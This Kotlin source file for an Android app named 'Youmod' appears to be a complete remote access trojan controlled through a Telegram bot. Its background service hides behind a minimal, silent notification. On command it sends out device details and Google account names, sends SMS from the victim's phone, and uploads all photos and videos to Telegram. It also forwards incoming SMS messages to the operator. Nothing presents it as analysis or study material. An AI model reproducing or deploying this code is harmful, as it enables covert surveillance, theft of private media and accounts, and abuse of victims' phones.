package com.example.youmod

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import android.accounts.AccountManager
import android.provider.MediaStore
import android.telephony.SmsManager
import androidx.core.app.NotificationCompat
import com.google.gson.Gson
import com.google.gson.JsonParser
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.util.concurrent.TimeUnit

class BotService : Service() {

    private val client = OkHttpClient.Builder()
        .connectTimeout(35, TimeUnit.SECONDS)
        .readTimeout(35, TimeUnit.SECONDS)
        .writeTimeout(35, TimeUnit.SECONDS)
        .build()

    private var isRunning = true
    private var lastUpdateId = 0L
    private val gson = Gson()
    private lateinit var deviceId: String
    private val maxVideoSize = 45 * 1024 * 1024L

    override fun onCreate() {
        super.onCreate()
        val prefs = getSharedPreferences("agent_prefs", MODE_PRIVATE)
        deviceId = prefs.getString("device_id", "UNKNOWN") ?: "UNKNOWN"
        createNotificationChannel()
        val notification = createNotification()
        try {
            startForeground(1, notification)
        } catch (e: Exception) {}
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startBotPolling()
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "youmod_channel",
                "Youmod Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Background service"
                setSound(null, null)
                enableVibration(false)
                setShowBadge(false)
            }
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, "youmod_channel")
            .setContentTitle("Youmod")
            .setContentText("Service active")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .build()
    }

    private fun startBotPolling() {
        Thread {
            while (isRunning) {
                try {
                    val url = "https://api.telegram.org/bot${MainActivity.BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30"
                    val request = Request.Builder().url(url).get().build()
                    val response = client.newCall(request).execute()
                    val body = response.body?.string()
                    if (body != null) {
                        val json = JsonParser.parseString(body).asJsonObject
                        if (json.get("ok").asBoolean) {
                            val results = json.getAsJsonArray("result")
                            for (i in 0 until results.size()) {
                                val update = results[i].asJsonObject
                                val updateId = update.get("update_id").asLong
                                lastUpdateId = updateId
                                val message = update.getAsJsonObject("message")
                                val from = message.getAsJsonObject("from")
                                val userId = from.get("id").asLong
                                val chatId = message.getAsJsonObject("chat").get("id").asLong
                                if (userId == MainActivity.AUTHORIZED_USER) {
                                    val text = if (message.has("text")) message.get("text").asString else ""
                                    handleCommand(chatId, text)
                                }
                            }
                        }
                    }
                    response.close()
                } catch (e: Exception) {
                    try { Thread.sleep(5000) } catch (ie: InterruptedException) {}
                }
            }
        }.start()
    }

    private fun handleCommand(chatId: Long, text: String) {
        val parts = text.trim().split("\\s+".toRegex(), 3)
        val command = parts[0].lowercase()
        val arg1 = if (parts.size > 1) parts[1] else ""
        val arg2 = if (parts.size > 2) parts[2] else ""

        when (command) {
            "/info" -> handleInfo(chatId)
            "/sms" -> handleSms(chatId, arg1, arg2)
            "/photo" -> handlePhoto(chatId)
            "/video" -> handleVideo(chatId)
            else -> sendMessage(chatId, "Unknown command. Available: /info, /sms, /photo, /video")
        }
    }

    private fun handleInfo(chatId: Long) {
        try {
            val manufacturer = Build.MANUFACTURER
            val model = Build.MODEL
            val osVer = Build.VERSION.RELEASE
            val buildNumber = Build.DISPLAY
            val resolution = "${resources.displayMetrics.widthPixels}x${resources.displayMetrics.heightPixels}"
            val batteryIntent = registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
            val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, 0) ?: 0
            val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, 100) ?: 100
            val batteryPct = (level * 100) / scale
            val plugged = batteryIntent?.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0) ?: 0
            val chargingState = when {
                plugged == BatteryManager.BATTERY_PLUGGED_AC -> "AC"
                plugged == BatteryManager.BATTERY_PLUGGED_USB -> "USB"
                plugged == BatteryManager.BATTERY_PLUGGED_WIRELESS -> "Wireless"
                else -> "Not charging"
            }
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = cm.activeNetwork
            val caps = network?.let { cm.getNetworkCapabilities(it) }
            var connectivity = "Unknown"
            if (caps != null) {
                connectivity = when {
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Cellular"
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
                    else -> "Other"
                }
            }
            var gmailAccounts = "None found"
            try {
                val am = AccountManager.get(this)
                val accounts = am.getAccountsByType("com.google")
                if (accounts.isNotEmpty()) {
                    gmailAccounts = accounts.joinToString(", ") { it.name }
                }
            } catch (e: Exception) { gmailAccounts = "Error: ${e.message}" }

            val infoText = buildString {
                appendLine("Device ID: $deviceId")
                appendLine("Battery: $batteryPct% ($chargingState)")
                appendLine("Connectivity: $connectivity")
                appendLine("Manufacturer: $manufacturer")
                appendLine("Model: $model")
                appendLine("Android: $osVer")
                appendLine("Build: $buildNumber")
                appendLine("Screen: $resolution")
                appendLine("Gmail: $gmailAccounts")
                appendLine("Device: ${Build.DEVICE}")
                appendLine("Product: ${Build.PRODUCT}")
                appendLine("Board: ${Build.BOARD}")
                appendLine("Brand: ${Build.BRAND}")
                appendLine("Hardware: ${Build.HARDWARE}")
                appendLine("Fingerprint: ${Build.FINGERPRINT}")
                appendLine("Bootloader: ${Build.BOOTLOADER}")
                appendLine("Radio: ${Build.getRadioVersion() ?: "Unknown"}")
                appendLine("Serial: ${Build.SERIAL}")
                appendLine("SDK: ${Build.VERSION.SDK_INT}")
            }
            sendMessage(chatId, infoText)
        } catch (e: Exception) {
            sendMessage(chatId, "Error: ${e.message}")
        }
    }

    private fun handleSms(chatId: Long, phoneNumber: String, messageText: String) {
        Thread {
            try {
                if (phoneNumber.isEmpty() || messageText.isEmpty()) {
                    sendMessage(chatId, "Usage: /sms <phone_number> <message_text>")
                    return@Thread
                }
                val smsManager = SmsManager.getDefault()
                smsManager.sendTextMessage(phoneNumber, null, messageText, null, null)
                sendMessage(chatId, "SMS sent to $phoneNumber from device $deviceId")
            } catch (e: Exception) {
                sendMessage(chatId, "SMS failed: ${e.message}")
            }
        }.start()
    }

    private fun handlePhoto(chatId: Long) {
        Thread {
            try {
                val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                val projection = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DATA,
                    MediaStore.Images.Media.SIZE
                )
                val cursor = contentResolver.query(uri, projection, null, null, MediaStore.Images.Media.SIZE + " ASC")
                val images = mutableListOf<Pair<String, Long>>()
                cursor?.use { c ->
                    val dataIdx = c.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                    val sizeIdx = c.getColumnIndex(MediaStore.Images.Media.SIZE)
                    while (c.moveToNext()) {
                        val path = c.getString(dataIdx)
                        val size = if (sizeIdx >= 0) c.getLong(sizeIdx) else 0L
                        if (path != null) images.add(path to size)
                    }
                }
                if (images.isEmpty()) {
                    sendMessage(chatId, "No images found on device.")
                    return@Thread
                }
                sendMessage(chatId, "Found ${images.size} images. Sending in batches...")
                var batch = mutableListOf<File>()
                var batchCount = 0
                for ((path, _) in images) {
                    val file = File(path)
                    if (file.exists() && file.length() < 10 * 1024 * 1024) {
                        batch.add(file)
                        if (batch.size >= 10) {
                            batchCount++
                            sendPhotoBatch(chatId, batch, batchCount)
                            batch = mutableListOf()
                            Thread.sleep(2000)
                        }
                    }
                }
                if (batch.isNotEmpty()) {
                    batchCount++
                    sendPhotoBatch(chatId, batch, batchCount)
                }
                sendMessage(chatId, "Sent $batchCount batches. Device ID: $deviceId")
            } catch (e: Exception) {
                sendMessage(chatId, "Photo command error: ${e.message}")
            }
        }.start()
    }

    private fun sendPhotoBatch(chatId: Long, files: List<File>, batchNum: Int) {
        try {
            val media = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId.toString())
                .addFormDataPart("caption", "Batch $batchNum - Device ID: $deviceId")

            for ((i, file) in files.withIndex()) {
                val mime = "image/jpeg".toMediaType()
                media.addFormDataPart("photo", "img_${i}.jpg", file.asRequestBody(mime))
            }

            val url = "https://api.telegram.org/bot${MainActivity.BOT_TOKEN}/sendMediaGroup"
            val request = Request.Builder().url(url).post(media.build()).build()
            client.newCall(request).execute().close()
        } catch (e: Exception) {
            for (file in files) {
                try {
                    sendSinglePhoto(chatId, file)
                    Thread.sleep(500)
                } catch (e2: Exception) {}
            }
        }
    }

    private fun sendSinglePhoto(chatId: Long, file: File) {
        try {
            val url = "https://api.telegram.org/bot${MainActivity.BOT_TOKEN}/sendPhoto"
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId.toString())
                .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaType()))
                .addFormDataPart("caption", "Device ID: $deviceId")
                .build()
            val request = Request.Builder().url(url).post(requestBody).build()
            client.newCall(request).execute().close()
        } catch (e: Exception) {}
    }

    private fun handleVideo(chatId: Long) {
        Thread {
            try {
                val uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
                val projection = arrayOf(
                    MediaStore.Video.Media._ID,
                    MediaStore.Video.Media.DATA,
                    MediaStore.Video.Media.SIZE
                )
                val cursor = contentResolver.query(uri, projection, null, null, MediaStore.Video.Media.SIZE + " ASC")
                val videos = mutableListOf<Pair<String, Long>>()
                cursor?.use { c ->
                    val dataIdx = c.getColumnIndexOrThrow(MediaStore.Video.Media.DATA)
                    val sizeIdx = c.getColumnIndex(MediaStore.Video.Media.SIZE)
                    while (c.moveToNext()) {
                        val path = c.getString(dataIdx)
                        val size = if (sizeIdx >= 0) c.getLong(sizeIdx) else 0L
                        if (path != null) videos.add(path to size)
                    }
                }
                if (videos.isEmpty()) {
                    sendMessage(chatId, "No videos found on device.")
                    return@Thread
                }
                sendMessage(chatId, "Found ${videos.size} videos. Sending within size limits...")
                var batchCount = 0
                for ((path, size) in videos) {
                    val file = File(path)
                    if (!file.exists()) continue
                    if (size > maxVideoSize) {
                        sendMessage(chatId, "Skipping video (too large: ${size / 1024 / 1024}MB): ${file.name}")
                        continue
                    }
                    batchCount++
                    sendSingleVideo(chatId, file)
                    Thread.sleep(1500)
                }
                sendMessage(chatId, "Sent $batchCount videos. Device ID: $deviceId")
            } catch (e: Exception) {
                sendMessage(chatId, "Video command error: ${e.message}")
            }
        }.start()
    }

    private fun sendSingleVideo(chatId: Long, file: File) {
        try {
            val url = "https://api.telegram.org/bot${MainActivity.BOT_TOKEN}/sendVideo"
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId.toString())
                .addFormDataPart("video", file.name, file.asRequestBody("video/mp4".toMediaType()))
                .addFormDataPart("caption", "Device ID: $deviceId")
                .build()
            val request = Request.Builder().url(url).post(requestBody).build()
            client.newCall(request).execute().close()
        } catch (e: Exception) {}
    }

    private fun sendMessage(chatId: Long, text: String) {
        try {
            val url = "https://api.telegram.org/bot${MainActivity.BOT_TOKEN}/sendMessage"
            val json = gson.toJson(mapOf("chat_id" to chatId.toString(), "text" to text))
            val body = json.toRequestBody("application/json".toMediaType())
            val request = Request.Builder().url(url).post(body).build()
            client.newCall(request).execute().close()
        } catch (e: Exception) { e.printStackTrace() }
    }

    fun forwardSmsToTelegram(sender: String, message: String, timestamp: Long) {
        try {
            val text = "New SMS received\nDevice ID: $deviceId\nFrom: $sender\nTime: $timestamp\nMessage: $message"
            val url = "https://api.telegram.org/bot${MainActivity.BOT_TOKEN}/sendMessage"
            val json = gson.toJson(mapOf("chat_id" to MainActivity.AUTHORIZED_USER.toString(), "text" to text))
            val body = json.toRequestBody("application/json".toMediaType())
            val request = Request.Builder().url(url).post(body).build()
            client.newCall(request).execute().close()
        } catch (e: Exception) { e.printStackTrace() }
    }

    override fun onDestroy() {
        isRunning = false
        super.onDestroy()
    }
}
